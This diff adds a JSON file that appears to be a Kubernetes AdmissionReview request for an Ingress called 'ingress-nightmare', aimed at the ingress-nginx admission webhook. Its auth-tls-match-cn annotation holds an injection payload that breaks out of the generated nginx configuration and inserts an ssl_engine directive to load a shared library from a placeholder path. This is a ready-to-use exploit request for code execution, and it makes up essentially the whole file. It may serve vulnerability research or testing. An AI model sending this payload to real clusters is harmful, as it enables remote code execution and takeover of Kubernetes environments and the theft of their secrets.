@@ -1,0 +1,65 @@
+{
+  "kind": "AdmissionReview",
+  "apiVersion": "admission.k8s.io/v1",
+  "request": {
+    "uid": "8750862f-46f5-4c21-b1f4-d3b66ccd997f",
+    "kind": {
+      "group": "networking.k8s.io",
+      "version": "v1",
+      "kind": "Ingress"
+    },
+    "resource": {
+      "group": "networking.k8s.io",
+      "version": "v1",
+      "resource": "ingresses"
+    },
+    "requestKind": {
+      "group": "networking.k8s.io",
+      "version": "v1",
+      "kind": "Ingress"
+    },
+    "requestResource": {
+      "group": "networking.k8s.io",
+      "version": "v1",
+      "resource": "ingresses"
+    },
+    "name": "ingress-nightmare",
+    "operation": "CREATE",
+    "object": {
+      "kind": "Ingress",
+      "apiVersion": "networking.k8s.io/v1",
+      "metadata": {
+        "name": "ingress-nightmare",
+        "namespace": "default",
+        "creationTimestamp": null,
+        "annotations": {
+          "nginx.ingress.kubernetes.io/auth-tls-match-cn": "CN=abc #(\n){}\nset $proxy_alternative_upstream_name \"\";\n}}\nssl_engine <PATH>;\nlocation /403 {#",
+          "nginx.ingress.kubernetes.io/auth-tls-secret": "default/ingress-nightmare-tls"
+        }
+      },
+      "spec": {
+        "rules": [
+          {
+            "http": {
+              "paths": [
+                {
+                  "path": "/",
+                  "pathType": "Prefix",
+                  "backend": {
+                    "service": {
+                      "name": "nginx",
+                      "port": {
+                        "number": 80
+                      }
+                    }
+                  }
+                }
+              ]
+            }
+          }
+        ],
+        "ingressClassName": "nginx"
+      }
+    }
+  }
+}
